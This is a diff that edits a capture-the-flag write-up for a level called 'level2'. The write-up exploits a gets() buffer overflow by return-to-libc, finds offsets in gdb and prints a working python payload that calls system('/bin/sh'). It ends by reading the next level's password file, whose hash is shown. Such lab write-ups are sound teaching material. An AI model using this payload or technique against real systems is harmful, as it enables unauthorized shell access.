@@ -83,22 +83,15 @@ End of assembler dump.
 (gdb) 
 ```
 
-Using ghidra to make a source code representation, the main function only call the p function.
-
 It use the get() function that is vulnerable to buffer overflow, but this time, there is no function that spawns a shell for us.
-
 
 We will have to find a way to call system ourself, and make the binary execute it.
 
-
 Return-to-libc exploit :
-
 
 The strategy in this exploit is, by using the libc, withdrawing the address of the system() function, we will then overwrite the return address with random character, and then write the argument "/bin/sh" using its addresses.
 
-
 Lets gather all of our address.
-
 
 The EBP is 4 byte before EIP, so we can just find the offset of the EIP and substrace 4 byte, but there is a way to find the EBP anyway lets use it :
 
@@ -164,7 +157,6 @@ $5 = 76
 ```
 
 The EBP start at 76, and the EIP at 80
-
 
 
 System() adress :
@@ -290,7 +282,7 @@ We will overwrite the EIP with the ret address, so it will skip the if and execu
 python -c "print 'A' * 80 + '\x3e\x85\x04\x08' '\x60\xb0\xe6\xb7' + '\x41\x41\x41\x41' + '\x58\xcc\xf8\xb7'" | ./level2
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��AAAAX���
 Segmentation fault (core dumped)
-```
+```   
 
 Maybe the shell got executed lets see:
 
@@ -303,6 +295,6 @@ cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
 
-Yep, since the executable closed, STDIN also do so we need to keep hand on it using a cat and subshells.
+Yep, since the executable closed, STDIN got closed too, so we need to keep a hand on it using a cat and subshells.
 
-It was a really though one for me.
+This one was tricky.
